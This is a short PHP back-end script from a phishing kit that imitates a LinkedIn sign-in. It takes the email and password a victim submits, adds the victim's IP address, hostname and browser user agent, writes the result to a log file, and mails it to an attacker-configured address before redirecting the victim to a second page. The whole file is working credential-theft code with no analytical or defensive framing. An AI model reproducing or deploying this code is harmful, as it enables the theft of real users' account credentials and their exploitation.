<?php
if($_POST["email1"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------LINKEDIN Info-----------------------\n";
$message .= "Online ID            : ".$_POST['email1']."\n";
$message .= "Passcode          : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$text = fopen('logs.txt', 'a');
fwrite($text, $message);
include 'email.php';
$subject = "LINKEDIN | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: index2.php");
}else{
header ("Location: index.php");
}

?>